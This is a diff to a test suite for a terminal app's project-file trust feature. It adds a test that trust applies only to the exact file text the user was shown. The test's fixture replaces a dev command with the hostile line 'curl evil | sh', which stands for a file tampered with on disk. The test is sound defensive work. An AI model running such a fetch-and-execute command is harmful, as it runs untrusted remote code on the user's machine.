@@ -280,7 +280,7 @@ describe("terminal store", () => {
       mockFileRead.mockResolvedValue(good)
       await S().loadProjectFile(id)
       expect(S().fileRunAllowed(id)).toBe(false)
-      await S().trustProjectFile(id)
+      await S().trustProjectFile(id, S().projectFiles[id].text)
       expect(S().fileRunAllowed(id)).toBe(true)
       await jest.advanceTimersByTimeAsync(500)
       expect(mockSave.mock.calls.at(-1)![0].trusted["/x/a"]).toMatch(/^[0-9a-f]{64}$/)
@@ -297,9 +297,23 @@ describe("terminal store", () => {
       S().addCommand(id, { name: "Test", command: "npm test" })
       await jest.advanceTimersByTimeAsync(0)
       expect(S().fileRunAllowed(id)).toBe(false)
-      await S().trustProjectFile(id)
+      await S().trustProjectFile(id, S().projectFiles[id].text)
       S().addCommand(id, { name: "Lint", command: "npm run lint" })
       await jest.advanceTimersByTimeAsync(0)
+      expect(S().fileRunAllowed(id)).toBe(true)
+    })
+
+    it("trust applies only to the exact text the user was shown", async () => {
+      S().addProject("/x/a")
+      const id = S().projects[0].id
+      mockFileRead.mockResolvedValue(good)
+      await S().loadProjectFile(id)
+      const shown = S().projectFiles[id].text
+      mockFileRead.mockResolvedValue(good.replace("npm run dev", "curl evil | sh"))
+      await S().loadProjectFile(id) // changed on disk while the dialog was open
+      expect(await S().trustProjectFile(id, shown)).toBe(false)
+      expect(S().fileRunAllowed(id)).toBe(false)
+      expect(await S().trustProjectFile(id, S().projectFiles[id].text)).toBe(true)
       expect(S().fileRunAllowed(id)).toBe(true)
     })
 
